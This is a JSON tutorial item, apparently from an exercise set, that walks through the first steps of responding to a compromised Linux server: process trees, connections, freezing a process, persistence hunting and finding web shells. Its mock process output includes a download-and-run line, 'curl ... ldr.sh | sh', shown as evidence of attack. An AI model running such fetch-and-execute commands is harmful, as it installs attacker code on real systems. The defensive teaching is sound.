@@ -1,0 +1,46 @@
+{
+  "id": "security-tutorial-010",
+  "type": "tutorial",
+  "category": "security",
+  "title": "First 15 Minutes on a Possibly Compromised Server",
+  "difficulty": "advanced",
+  "tags": ["security", "incident-response", "forensics", "linux"],
+  "intro": "An alert says a server may be compromised. The first quarter hour decides whether you learn what happened or destroy the evidence. The order: look before you touch, preserve what disappears on reboot (processes, connections), hunt for persistence, contain, and only then clean or rebuild. This is the checklist; mystery-linux-005 and 006 let you practice it live.",
+  "steps": [
+    {
+      "prompt": "See every process as a tree, so you can tell what started what.",
+      "expected_commands": ["ps auxf", "ps -ef --forest", "ps axjf"],
+      "fake_output": "root       812  nginx: master process /usr/sbin/nginx\nwww-data   815   \\_ nginx: worker process\nwww-data  6511       \\_ sh -c curl -fsSL http://45.9.148.3/ldr.sh | sh\nwww-data  6860           \\_ /tmp/.x/kdevtmpfsi",
+      "explanation": "The miner's parent chain leads back to an nginx worker: the web app was the way in.",
+      "why": "A tree shows ancestry, and ancestry reveals the entry point. A shell spawned by a web server process is one of the strongest compromise signals there is, because web servers don't normally run shells."
+    },
+    {
+      "prompt": "Record established network connections with their processes before anything changes.",
+      "expected_commands": ["sudo ss -tnp state established", "ss -tnp state established", "sudo ss -tnp"],
+      "fake_output": "Recv-Q Send-Q Local Address:Port    Peer Address:Port   Process\n0      0      10.0.1.15:51876       45.9.148.3:3333     users:((\"kdevtmpfsi\",pid=6860,fd=7))\n0      0      10.0.1.15:22          198.51.100.23:50412 users:((\"sshd\",pid=2211,fd=4))",
+      "explanation": "The miner talks to 45.9.148.3:3333; the SSH session is yours, from the office.",
+      "why": "Connections, running processes, and memory disappear on reboot, which is why 'just reboot it' destroys evidence. Save outputs like this to a file off the host (or at least into the incident ticket) as you go."
+    },
+    {
+      "prompt": "Freeze the suspicious process 6860 instead of killing it, so it stops working but can still be examined.",
+      "expected_commands": ["sudo kill -STOP 6860", "kill -STOP 6860", "sudo kill -19 6860"],
+      "fake_output": "(no output: pid 6860 is stopped (state T) and uses no CPU)",
+      "explanation": "The miner is paused, with its memory and open files intact.",
+      "why": "SIGSTOP can't be caught or ignored, so the process can't react or clean up. Forensics can then copy /proc/6860/exe and its memory. Killing it immediately loses that, and without removing persistence first it just comes back (mystery-linux-005)."
+    },
+    {
+      "prompt": "Hunt for persistence: list all systemd timers, a less obvious alternative to cron.",
+      "expected_commands": ["systemctl list-timers --all", "sudo systemctl list-timers --all"],
+      "fake_output": "NEXT                        LEFT     UNIT                     ACTIVATES\nSun 2026-09-28 11:00:00 UTC 12min    logrotate.timer          logrotate.service\nSun 2026-09-28 10:50:00 UTC 2min     dbus-update.timer        dbus-update.service\nMon 2026-09-29 00:00:00 UTC 13h      apt-daily.timer          apt-daily.service",
+      "explanation": "dbus-update.timer fires every 10 minutes, and it isn't a real system unit: a name chosen to look boring.",
+      "why": "Common persistence spots: all users' crontabs, systemd services and timers, authorized_keys, shell rc files (~/.bashrc), /etc/ld.so.preload, and new UID-0 accounts. Attackers name things to blend in (dbus-update, kdevtmpfsi), so compare against a clean host or package lists ('dpkg -S <file>' says which package owns a file)."
+    },
+    {
+      "prompt": "Find recently modified files under /var/www (the entry point), changed in the last 2 days.",
+      "expected_commands": ["sudo find /var/www -type f -mtime -2", "find /var/www -type f -mtime -2", "find /var/www -mtime -2 -type f"],
+      "fake_output": "/var/www/shop/uploads/avatar_8812.php\n/var/www/shop/uploads/.cache.php",
+      "explanation": "Two PHP files in the uploads directory, where only images should be.",
+      "why": "Executable code in an upload directory is a web shell: how the attacker got a shell as www-data in the first place (security-incident-004 covers the cleanup). Timestamps can be faked, so treat -mtime as a lead, not proof."
+    }
+  ]
+}
